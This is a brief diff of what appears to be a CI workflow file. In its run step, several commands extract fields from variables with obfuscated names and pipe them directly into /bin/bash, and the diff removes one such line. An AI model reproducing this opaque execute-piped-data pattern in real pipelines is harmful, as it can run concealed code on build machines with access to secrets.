@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$orv47" | jq -r .cxgl331 | /bin/bash
           echo $vx438 | jq -r .meyj73 | /bin/bash
           printf '%s' "$fmxjz9232" | jq -r .hdqok36591 | /bin/bash
-          echo $mmgy4 | jq -r .mqyq175 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
